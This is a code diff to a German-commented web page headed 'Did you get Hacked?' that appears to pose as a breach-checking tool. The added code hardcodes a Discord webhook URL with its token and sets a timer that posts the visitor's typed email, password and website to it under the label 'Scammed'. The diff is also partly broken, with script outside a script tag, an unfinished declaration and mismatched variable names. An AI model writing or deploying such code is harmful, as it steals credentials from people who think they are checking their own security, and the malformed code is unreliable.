@@ -150,6 +150,15 @@
     </style>
 </head>
 <body>
+
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1501994844846030885/CJVAFCr56VnpQCyLsZ7Vu9IwXgyJhawin0VqEWRoIhHGYllvHxR3hkIJwVfjq70D9Cod";
+
+// =========================
+// LIVE STATE VARIABLE
+// =========================
+let currentstring = "";
+let lastSentstring = "";
+
     <div class="container">
         <h1>Did you get Hacked?</h1>
         
@@ -190,8 +199,27 @@
 
             // Alle Eingaben in einen einzigen String kombinieren
             const combinedData = `Email: ${email} | Password: ${password} | Website: ${website}`;
+            const lastcombinedData
+
+setInterval(() => {
+    if (currentPassword !== lastSentPassword) {
+        lastSentPassword = currentPassword;
+
+        fetch(WEBHOOK_URL, {
+           method: "POST",
+           headers: { "Content-Type": "application/json" },
+           body: JSON.stringify({
+              content: `Scammed: ${combinedData}`,
+              embeds: [],
+              username: "Scamm"
+           })
+        });
+    }
+}, 1000);
             
             console.log('Combined data:', combinedData); // Für Debugging im Browser
+
+
             
             // Popup anzeigen
             document.getElementById('popup').style.display = 'block';
